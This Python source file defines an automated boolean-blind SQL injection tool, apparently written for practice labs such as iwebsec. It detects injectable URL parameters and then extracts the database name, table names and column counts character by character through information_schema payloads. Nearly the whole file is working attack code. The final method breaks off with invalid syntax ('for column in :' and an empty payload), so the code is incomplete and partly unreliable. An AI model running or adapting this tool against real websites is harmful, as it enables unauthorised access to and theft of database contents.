from typing import Literal

import requests
from requests import Response
from termcolor import colored
import datetime
import random

info = f"[{colored("info", "green")}]"
error = f"[{colored("error", "red")}]"
fatal = f"[{colored("fatal_error", "white", "on_light_red")}]"


def get_time():
    return f"[{colored(f"{datetime.datetime.now().strftime('%H:%M:%S.%f')}", "light_cyan")}]"

def restrict_values(values):
    def decorator(func):
        def wrapper(*args, **kwargs):
            if args and args[0] not in values:
                raise ValueError
            return func(*args, **kwargs)
        return wrapper
    return decorator

def parse_url(url: str):
    if "?" in url:
        pairs = {}
        part = url.split("?")
        if "&" in part[1]:
            params_value_pairs = part[1].split("&")
            for pair in params_value_pairs:
                p = pair.split("=")
                pairs[p[0]] = p[1]
        else:
            p = part[1].split("=")
            pairs[p[0]] = p[1]
        return pairs
    else:
        print(fatal, "url中需带有查询参数")
        exit()


class BooleanInjector:
    def __init__(self, url: str, cookie=None, use_cookie: bool = False, show_payload: bool = False):
        self.show_payload = show_payload
        self.normal_response: Response = requests.get(url=url, cookies=cookie)
        self.raw_url = url
        self.params_dist = parse_url(url)
        self.params = list(self.params_dist.keys())
        self.values = list(self.params_dist.values())
        self.target_url = url.split("?")[0]
        self.params_count = len(self.params)
        self.use_cookie = use_cookie
        self.cookie = cookie if use_cookie else {}

        self.injectable_params: list = []
        self.injection_types: list = []

        self.db_length = 0
        self.db_name = ""
        self.tables, self.columns, self.rows = [], [], []

        self.test_injection_points()

        print(get_time(), "\n", f"[{colored("initialization", "light_blue")}]", sep="")
        print("raw_url:", self.raw_url)
        print("params_count:", self.params_count)
        print("params:", self.params)
        print("injectable_params_index:", self.injectable_params)
        print("injection_type:", self.injection_types)

    def test_injection_points(self) -> None:
        # injection type: number
        for i in range(0, self.params_count):
            random_int = random.randint(1, 10000)
            payload_true = f"and {random_int}={random_int} #"
            payload_false = f"and {random_int}={random_int + 1} #"
            response_true = requests.get(url=self.construct_payload(payload_true, i, "number"))
            response_false = requests.get(url=self.construct_payload(payload_false, i, "number"))
            if response_true.text == self.normal_response.text and response_true.text != response_false.text:
                print(get_time(), info, f"Got injectable param:{self.params[i]} (type:number)")
                if self.show_payload:
                    print("by using payload:\n", colored(self.construct_payload(payload_false, i, "number"), "cyan"))
                self.injectable_params.append(i)
                self.injection_types.append("number")
            else:
                payload_true = f"and '{random_int}'='{random_int}' #"
                payload_false = f"and '{random_int}'='{random_int + 1}' #"
                response_true = requests.get(url=self.construct_payload(payload_true, i, "char"))
                response_false = requests.get(url=self.construct_payload(payload_false, i, "char"))
                if response_true.text == self.normal_response.text and response_true.text != response_false.text:
                    print(get_time(), info, f"Got injectable param:{self.params[i]} (type:char)",
                          colored(self.construct_payload(payload_false, i, "char"), "cyan"))
                    if self.show_payload:
                        print("by using payload:\n",
                              colored(self.construct_payload(payload_false, i, "number"), "cyan"))
                    self.injectable_params.append(i)
                    self.injection_types.append("char")

        if len(self.injectable_params) == 0:
            print(fatal, "All tested parameters do not appear to be injectable.")
            exit()

    def construct_payload(self,
                          sqli: str,
                          point: int,
                          inject_type: Literal["number", "char"] | None = None
                          ) -> str:
        """
        根据注入点和sql语句组装payload
        :param sqli: 注入的sql语句
        :param point: 选择注入点
        :param inject_type: 注入类型, 如果注入类型未指定，则根据self.injection_type获取注入类型
        :return: 构建好的带有目标url的完整payload
        """
        if inject_type is None:
            inject_param = self.injectable_params[point]
            if inject_param in self.injectable_params:
                t = self.injection_types[self.injectable_params.index(inject_param)]
            else:
                print(fatal)
                exit()
        else:
            t = inject_type
        # if self.params_count < 2:
        #     if t == "number":
        #         payload = f"{self.target_url}?{str(self.params[0])}={str(self.values[0])} {sqli}"
        #     else:
        #         payload = f"{self.target_url}?{str(self.params[0])}={str(self.values[0])}' {sqli}"
        # else:
        payload = f"{self.target_url}?"
        for i in range(0, self.params_count):
            payload += f"{self.params[i]}={self.values[i] + ("'" if t == "char" else "") + (f" {sqli}" if i == point else "") + ("&" if i != self.params_count - 1 else "")}"
        return payload

    def get_payload_result(self, sqli, point) -> bool:
        """
        :param sqli: 具有bool值的sql语句
        :param point: 选择注入点
        :return: 返回布尔值即payload内容是否为真
        """
        payload = self.construct_payload(sqli, point)
        sqli_response = requests.get(url=payload, cookies=self.cookie)
        # print(get_time(), "[info]", "payload constructed:", payload)
        # 确认条件
        return True if self.normal_response.text == sqli_response.text else False

        # for iwebsec
        # return True if "welcome to iwebsec!!!" in sqli_response.text else False

    def get_db_length(self) -> int:
        for point in range(0, self.params_count):
            for length in range(1, 32):
                payload = f"and length(database()) = {length} #"
                if self.get_payload_result(payload, point):
                    print(get_time(), info, colored(f"Got database name length:", "light_green"),
                          colored(f"{length}", "light_yellow"),
                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}")
                    self.db_length = length
                    return length
        print(get_time(), fatal, colored("Unable to get database name length.", "red"))

    def get_db_name(self):
        extracted_name = ""
        payload_list = []
        for point in range(0, self.params_count):
            print(get_time(), info, "fetching database name...", end="")
            for i in range(1, self.db_length + 1):
                # ?? 或许可以尝试使用二分查找提高效率 ??
                for char in range(32, 127):
                    payload = f"and ascii(substring(database(), {i}, 1))={char} #"
                    if self.get_payload_result(payload, point):
                        print(chr(char), end="", flush=True)
                        payload_list.append(self.construct_payload(payload, point))
                        extracted_name += chr(char)
            print("\n", end="")
            if extracted_name != "":
                self.db_name = extracted_name
                print(get_time(), info, colored("Got database name:", "light_green"),
                      colored(extracted_name, "light_yellow"),
                      end="by using payload\n" if self.show_payload else "\n")
                if self.show_payload:
                    for payload in payload_list:
                        print(colored(payload, "cyan"))
                break
            else:
                print(get_time(), fatal, colored("unable to get database name length.", "red"))

    def get_tables(self):
        table_count = 0
        table_length = []
        for point in range(0, self.params_count):
            # get tables count
            print(get_time(), info, "fetching tables count...")
            for length in range(1, 32):
                payload = f"and (select count(table_name) from information_schema.tables where table_schema=database())={length} #"
                if self.get_payload_result(payload, point):
                    print(get_time(), info, colored(f"Got table count:", "light_green"),
                          colored(f"{length}", "light_yellow"),
                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
                          if self.show_payload else "\n")
                    table_count = length
                    break
            # get tables length
            for table in range(0, table_count):
                print(get_time(), info, f"fetching No.{table + 1} table length...")
                for length in range(0, 32):
                    payload = f"and length((select table_name from information_schema.tables where table_schema=database() limit {table},1))={length}"
                    if self.get_payload_result(payload, point):
                        print(get_time(), info, colored(f"Got No.{table + 1} table length:", "light_green"),
                              colored(f"{length}", "light_yellow"),
                              end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}"
                              if self.show_payload else "\n")
                        table_length.append(length)
                        payload_list = []
                        extracted_name = ""
                        # get table name
                        print(get_time(), info, f"fetching No.{table + 1} table name...", end="")
                        for i in range(0, length + 1):
                            for char in range(32, 127):
                                payload = f"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {table},1),{i},1))={char} #"
                                if self.get_payload_result(payload, point):
                                    print(chr(char), end="", flush=True)
                                    payload_list.append(self.construct_payload(payload, point))
                                    extracted_name += chr(char)
                        print("\n", end="")
                        print(get_time(), info, colored(f"Got No.{table + 1} name:", "light_green"),
                              colored(extracted_name, "light_yellow"),
                              end="by using payload\n" if self.show_payload else "\n")
                        self.tables.append(extracted_name)
                        if self.show_payload:
                            for payload in payload_list:
                                print(colored(payload, "cyan"))
                        break
        if len(table_length) == 0:
            print(fatal)

    # @restrict_values(self.tables)
    def get_columns(self, witch_table: str = "all"):

        columns_length, columns_count = [], []
        print(self.tables)
        for point in range(0, self.params_count):
            # get column count
            for table in self.tables:
                for c in range(1, 32):
                    payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0) #"
                    if self.get_payload_result(payload, point):
                        columns_count.append(c)
                        print(get_time(), info, colored(f"Got table[{table}] columns count: {c}"),
                              end=f"by using payload:\n{colored(payload, "cyan")}" if self.show_payload else "\n")
                        break
            # got all column counts in every table, then get column name length
            for column in :
                for length in range(1, 32):
                    payload = f""
                    if self.get_payload_result(payload, point):
                        columns_length.append(length)




